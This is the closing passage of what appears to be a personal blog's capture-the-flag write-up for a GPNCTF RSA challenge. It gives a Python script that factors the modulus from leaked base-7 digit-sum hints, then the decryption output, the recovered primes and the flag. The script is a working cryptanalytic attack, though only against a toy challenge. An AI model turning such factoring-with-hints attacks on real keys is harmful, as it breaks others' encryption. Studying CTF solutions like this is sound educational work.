</span></span><span style=display:flex><span>c_hex <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;78fe786edf7f78b5c7b0d4edd12ece946f021df730a825a7254dc80dddf8460a946eb25c4257c03a39a89472428534c1a98c0b509a2770ee1828c256941f67535f04ab05716c7ed86c821d821afed9ba4309837b4f3f6077e40c891bf6f3dcb714728c8458a0364562cb714fa9a596c7eccd4eafae6075dbab3f0ea745646fddeae98c058139a3200765b5f526f8807d6c72917218d7b77394da3fa6ab3a292ffc756a5b6b1c52bc58c4a212981da958c6bd6a21cd113cbc93497d5f016d6bc1a02cf77e96c3236d632d71a8b137c14742b3a5842754c35409e8f28126b91d6fa2b2fe4dedc531011ecce8943d2ee332acc3349e6256ce2c84d41aec718b4056&#34;</span>
</span></span><span style=display:flex><span>V_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;(5, 6, 1, 0, 6, 3, 5, 2, 2, 0, 6, 4, 0, 2, 2, 1, 2, 5, 3, 5, 4, 6, 1, 1, 2, 0, 2, 3, 5, 0, 6, 4, 0, 6, 1, 4, 0, 3, 5, 1, 2, 1, 6, 5, 1, 0, 1, 4, 3, 5, 2, 5, 4, 4, 4, 5, 2, 1, 3, 2, 3, 6, 2, 5, 1, 3, 3, 0, 6, 2, 2, 1, 4, 1, 3, 6, 3, 0, 4, 1, 4, 5, 0, 0, 0, 3, 2, 5, 0, 6, 3, 0, 5, 5, 1, 5, 4, 0, 5, 2, 0, 2, 3, 0, 4, 1, 2, 6, 5, 2, 3, 2, 4, 0, 2, 1, 1, 3, 5, 1, 6, 3, 2, 1, 3, 4, 6, 1, 0, 1, 1, 6, 1, 6, 6, 4, 1, 5, 2, 6, 3, 2, 0, 4, 5, 1, 1, 4, 5, 4, 0, 4, 5, 2, 1, 2, 1, 3, 1, 6, 5, 4, 4, 1, 1, 0, 5, 4, 1, 3, 1, 1, 5, 1, 0, 2, 5, 1, 2, 3, 6, 5, 2, 5, 3, 0, 6, 6, 5, 0, 3, 3, 0, 3, 6, 1, 4, 6, 2, 1, 1, 6, 2, 1, 3, 2, 5, 0, 1, 6, 3, 5, 6, 1, 2, 0, 4, 2, 4, 1, 4, 0, 6, 0, 0, 2, 5, 2, 0, 3, 0, 1, 2, 1, 0, 6, 3, 1, 4, 4, 5, 5, 1, 0, 1, 5, 6, 2, 0, 0, 1, 2, 0, 4, 1, 5, 6, 0, 0, 2, 6, 6, 2, 2, 5, 6, 2, 0, 4, 5, 2, 2, 4, 2, 2, 6, 5, 3, 1, 4, 5, 1, 0, 2, 4, 4, 1, 5, 4, 4, 6, 2, 3, 3, 6, 3, 3, 1, 6, 5, 3, 4, 5, 5, 0, 6, 5, 1, 3, 6, 3, 3, 2, 6, 5, 3, 5, 3, 5, 0, 3, 1, 6, 5, 2, 5, 0, 1, 2, 1, 6, 6, 0, 3, 1, 5, 6, 2, 6, 0, 6, 5, 5, 2, 6, 3, 1, 4, 6, 2, 3, 6, 0, 4, 5, 4, 1, 3, 2, 5, 6, 0, 1, 6, 6, 0, 0)&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>solve</span>():
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> int(n_hex, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    e <span style=color:#f92672>=</span> int(e_hex, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> int(c_hex, <span style=color:#ae81ff>16</span>)
</span></span><span style=display:flex><span>    V <span style=color:#f92672>=</span> eval(V_str)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    n_mod_7 <span style=color:#f92672>=</span> n <span style=color:#f92672>%</span> <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    possible_p0_q0 <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> p0 <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>7</span>):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> q0 <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>7</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (p0 <span style=color:#f92672>+</span> q0) <span style=color:#f92672>%</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>==</span> V[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>and</span> (p0 <span style=color:#f92672>*</span> q0) <span style=color:#f92672>%</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>==</span> n_mod_7:
</span></span><span style=display:flex><span>                possible_p0_q0<span style=color:#f92672>.</span>append((p0, q0))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Possible (p0, q0) pairs: </span><span style=color:#e6db74>{</span>possible_p0_q0<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> p_init, q_init <span style=color:#f92672>in</span> possible_p0_q0:
</span></span><span style=display:flex><span>        p_digits <span style=color:#f92672>=</span> [p_init]
</span></span><span style=display:flex><span>        q_digits <span style=color:#f92672>=</span> [q_init]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1</span>, len(V)):
</span></span><span style=display:flex><span>            found_next_digits <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> next_p_digit <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>7</span>):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>for</span> next_q_digit <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>7</span>):
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (next_p_digit <span style=color:#f92672>+</span> next_q_digit) <span style=color:#f92672>%</span> <span style=color:#ae81ff>7</span> <span style=color:#f92672>==</span> V[i]:
</span></span><span style=display:flex><span>                        <span style=color:#75715e># Construct the numbers up to the current digit</span>
</span></span><span style=display:flex><span>                        current_p_val <span style=color:#f92672>=</span> sum(d <span style=color:#f92672>*</span> (<span style=color:#ae81ff>7</span><span style=color:#f92672>**</span>j) <span style=color:#66d9ef>for</span> j, d <span style=color:#f92672>in</span> enumerate(p_digits <span style=color:#f92672>+</span> [next_p_digit]))
</span></span><span style=display:flex><span>                        current_q_val <span style=color:#f92672>=</span> sum(d <span style=color:#f92672>*</span> (<span style=color:#ae81ff>7</span><span style=color:#f92672>**</span>j) <span style=color:#66d9ef>for</span> j, d <span style=color:#f92672>in</span> enumerate(q_digits <span style=color:#f92672>+</span> [next_q_digit]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                        <span style=color:#75715e># Check if the product matches n modulo 7^(i+1)</span>
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (current_p_val <span style=color:#f92672>*</span> current_q_val) <span style=color:#f92672>%</span> (<span style=color:#ae81ff>7</span><span style=color:#f92672>**</span>(i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)) <span style=color:#f92672>==</span> n <span style=color:#f92672>%</span> (<span style=color:#ae81ff>7</span><span style=color:#f92672>**</span>(i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>)):
</span></span><span style=display:flex><span>                            p_digits<span style=color:#f92672>.</span>append(next_p_digit)
</span></span><span style=display:flex><span>                            q_digits<span style=color:#f92672>.</span>append(next_q_digit)
</span></span><span style=display:flex><span>                            found_next_digits <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>                            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> found_next_digits:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> found_next_digits:
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span> <span style=color:#75715e># This path didn&#39;t work, try next p0, q0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> len(p_digits) <span style=color:#f92672>==</span> len(V) <span style=color:#f92672>and</span> len(q_digits) <span style=color:#f92672>==</span> len(V):
</span></span><span style=display:flex><span>            <span style=color:#75715e># Reconstruct p and q from the digits (least significant first)</span>
</span></span><span style=display:flex><span>            p <span style=color:#f92672>=</span> sum(d <span style=color:#f92672>*</span> (<span style=color:#ae81ff>7</span><span style=color:#f92672>**</span>j) <span style=color:#66d9ef>for</span> j, d <span style=color:#f92672>in</span> enumerate(p_digits))
</span></span><span style=display:flex><span>            q <span style=color:#f92672>=</span> sum(d <span style=color:#f92672>*</span> (<span style=color:#ae81ff>7</span><span style=color:#f92672>**</span>j) <span style=color:#66d9ef>for</span> j, d <span style=color:#f92672>in</span> enumerate(q_digits))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> p <span style=color:#f92672>*</span> q <span style=color:#f92672>==</span> n:
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found p: </span><span style=color:#e6db74>{</span>p<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Found q: </span><span style=color:#e6db74>{</span>q<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#75715e># Now calculate phi(n) and d</span>
</span></span><span style=display:flex><span>                phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>                d <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#75715e># Decrypt the ciphertext</span>
</span></span><span style=display:flex><span>                m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>                flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>                print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#f92672>.</span>decode()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> flag<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> solve()
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> flag:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;The flag is: </span><span style=color:#e6db74>{</span>flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Could not find the flag.&#34;</span>)
</span></span></code></pre></div><h2 id=execution-and-flag>Execution and Flag</h2><p>Running the script successfully factored <code>n</code> into <code>p</code> and <code>q</code> and then decrypted the flag.</p><pre tabindex=0><code>Possible (p0, q0) pairs: [(1, 4), (4, 1)]
Found p: 107081590102994279431425142273165548583314246476215620342950117309270748047556198886880652973013533803026699630455405746204251672129112788665721566551654800021953684025972970279740511885379673381684517286535474827927390298929647937547334749938941564581210616732957069256721939937345544930292049384033685617959
Found q: 176905278104599945246676137446215110385207650620348722263066964160918233474291760221897848795622468492787847720198375810261341819191731473023323362043908703146030162716200850923581985730383926797182627925717132721727616831080816614622731687424811340659022489790537251723643356595292200458188611206172885332509
Flag: GPNCTF{w0w_FAc7orIng_wITh_HIntS_IS_FuN}
The flag is: GPNCTF{w0w_FAc7orIng_wITh_HIntS_IS_FuN}
</code></pre><h2 id=flag>Flag</h2><p><code>GPNCTF{w0w_FAc7orIng_wITh_HIntS_IS_FuN}</code></p><blockquote><p><strong>it was fun though</strong></p></blockquote></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
2025
Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>